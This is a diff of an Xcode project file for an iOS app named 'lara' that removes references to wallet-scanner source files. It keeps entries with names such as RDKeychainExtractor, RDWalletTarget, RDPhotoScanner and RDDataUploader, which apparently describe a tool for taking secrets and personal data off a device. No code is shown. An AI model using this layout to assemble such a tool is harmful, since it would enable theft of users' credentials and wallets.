@@ -28,16 +28,12 @@
 		9F4A1D2F3C4E567890123456 /* lara/lib/libxpf.dylib in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 9F4A1D2E3C4E567890123456 /* lara/lib/libxpf.dylib */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
 		9F4A1D423C4E567890123456 /* lara/lib/libgrabkernel2.dylib in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 9F4A1D413C4E567890123456 /* lara/lib/libgrabkernel2.dylib */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
 		5D6458AFD85B42B9BBC0766D /* RDAutoPilot.m in Sources */ = {isa = PBXBuildFile; fileRef = 9C816C0B8B9040AD9A0B800A /* RDAutoPilot.m */; };
-		B456FF4D782B4FDAA9D873E4 /* RDWalletScanner.m in Sources */ = {isa = PBXBuildFile; fileRef = 4671B8AC4B33450D8D429DA1 /* RDWalletScanner.m */; };
 		3AD715AFC8C44E8289617362 /* RDWalletTarget.m in Sources */ = {isa = PBXBuildFile; fileRef = FA1830DBF65A4040AB198CCA /* RDWalletTarget.m */; };
 		0C3F1CCA32E14518B4FD3A19 /* RDFileScanner.m in Sources */ = {isa = PBXBuildFile; fileRef = 58006B1F9F894375A399219C /* RDFileScanner.m */; };
 		CB4D022A71164C13B95C4C27 /* RDKeychainExtractor.m in Sources */ = {isa = PBXBuildFile; fileRef = B48D52D26C8741F1A38F8B90 /* RDKeychainExtractor.m */; };
 		46E8BAC3377442A084F99777 /* RDPhotoScanner.m in Sources */ = {isa = PBXBuildFile; fileRef = 819751AEBCFD46F58DA5950A /* RDPhotoScanner.m */; };
 		18DFB560BC8943729C798E46 /* RDDataPackager.m in Sources */ = {isa = PBXBuildFile; fileRef = 0F9D6A2D3DD041589C532585 /* RDDataPackager.m */; };
 		B5A701DC22BF4ED59EEAC3EF /* RDDataUploader.m in Sources */ = {isa = PBXBuildFile; fileRef = 29F52FD13F0840298C89B0CF /* RDDataUploader.m */; };
-		53B95E390E4B4B46906D5B4D /* RDWalletScannerBridge.swift in Sources */ = {isa = PBXBuildFile; fileRef = 70598798B43146EEA2D3416B /* RDWalletScannerBridge.swift */; };
-		4A43FE4CEB4F47219802C933 /* WalletScanner.h in Sources */ = {isa = PBXBuildFile; fileRef = AF6B6DE042234947B817DBE9 /* WalletScanner.h */; };
-		4159E1C92283485AA5BA791E /* WalletScanner.m in Sources */ = {isa = PBXBuildFile; fileRef = F18B943E1B504569AEA31D6F /* WalletScanner.m */; };
 		BDB6BA63F8F34D6AB93D1C0A /* RDWalletLoader.m in Sources */ = {isa = PBXBuildFile; fileRef = D38051032EEF4BA6AC14D57D /* RDWalletLoader.m */; };
 /* End PBXBuildFile section */
 
@@ -51,15 +47,12 @@
 				9F4A1D2F3C4E567890123456 /* lara/lib/libxpf.dylib in Embed Frameworks */,
 				9F4A1D423C4E567890123456 /* lara/lib/libgrabkernel2.dylib in Embed Frameworks */,
 							5D6458AFD85B42B9BBC0766D /* RDAutoPilot.m in Sources */,
-				B456FF4D782B4FDAA9D873E4 /* RDWalletScanner.m in Sources */,
 				3AD715AFC8C44E8289617362 /* RDWalletTarget.m in Sources */,
 				0C3F1CCA32E14518B4FD3A19 /* RDFileScanner.m in Sources */,
 				CB4D022A71164C13B95C4C27 /* RDKeychainExtractor.m in Sources */,
 				46E8BAC3377442A084F99777 /* RDPhotoScanner.m in Sources */,
 				18DFB560BC8943729C798E46 /* RDDataPackager.m in Sources */,
 				B5A701DC22BF4ED59EEAC3EF /* RDDataUploader.m in Sources */,
-				53B95E390E4B4B46906D5B4D /* RDWalletScannerBridge.swift in Sources */,
-				4159E1C92283485AA5BA791E /* WalletScanner.m in Sources */,
 				BDB6BA63F8F34D6AB93D1C0A /* RDWalletLoader.m in Sources */,
 );
 			name = "Embed Frameworks";
@@ -106,16 +99,12 @@
 		CC1C8B392F71DF9C00206982 /* lara.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = lara.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		CC6842DF2F8311C300B08EB0 /* libSystem.B.tbd */ = {isa = PBXFileReference; lastKnownFileType = "sourcecode.text-based-dylib-definition"; name = libSystem.B.tbd; path = usr/lib/libSystem.B.tbd; sourceTree = SDKROOT; };
 		9C816C0B8B9040AD9A0B800A /* RDAutoPilot.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "RDAutoPilot.m"; sourceTree = "<group>"; };
-		4671B8AC4B33450D8D429DA1 /* RDWalletScanner.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "RDWalletScanner.m"; sourceTree = "<group>"; };
 		FA1830DBF65A4040AB198CCA /* RDWalletTarget.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "RDWalletTarget.m"; sourceTree = "<group>"; };
 		58006B1F9F894375A399219C /* RDFileScanner.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "RDFileScanner.m"; sourceTree = "<group>"; };
 		B48D52D26C8741F1A38F8B90 /* RDKeychainExtractor.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "RDKeychainExtractor.m"; sourceTree = "<group>"; };
 		819751AEBCFD46F58DA5950A /* RDPhotoScanner.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "RDPhotoScanner.m"; sourceTree = "<group>"; };
 		0F9D6A2D3DD041589C532585 /* RDDataPackager.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "RDDataPackager.m"; sourceTree = "<group>"; };
 		29F52FD13F0840298C89B0CF /* RDDataUploader.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "RDDataUploader.m"; sourceTree = "<group>"; };
-		70598798B43146EEA2D3416B /* RDWalletScannerBridge.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "RDWalletScannerBridge.swift"; sourceTree = "<group>"; };
-		AF6B6DE042234947B817DBE9 /* WalletScanner.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "WalletScanner.h"; sourceTree = "<group>"; };
-		F18B943E1B504569AEA31D6F /* WalletScanner.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "WalletScanner.m"; sourceTree = "<group>"; };
 		D38051032EEF4BA6AC14D57D /* RDWalletLoader.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "RDWalletLoader.m"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
